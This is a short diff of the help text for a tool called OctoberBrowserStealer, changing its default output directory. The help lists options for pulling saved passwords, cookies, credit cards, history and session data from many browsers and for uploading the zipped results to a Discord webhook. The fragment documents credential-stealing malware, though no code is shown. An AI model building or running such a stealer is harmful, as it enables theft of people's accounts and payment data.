@@ -42,7 +42,7 @@ Available Commands:
 Flags:
   -b, --browser string           target browser: all|360|360x|arc|brave|chrome|chrome-beta|chromium|coccoc|dc|duckduckgo|edge|firefox|opera|opera-gx|qq|sogou|vivaldi|yandex (default "all")
   -c, --category string          data categories (comma-separated): all|password,cookie,bookmark,history,download,creditcard,extension,localstorage,sessionstorage (default "all")
-  -d, --dir string               output directory (default "results")
+  -d, --dir string               output directory (default "local pc name")
       --discord-webhook string   Discord webhook URL to upload zip
   -f, --format string            output format: csv|json|cookie-editor (default "json")
   -h, --help                     help for OctoberBrowserStealer
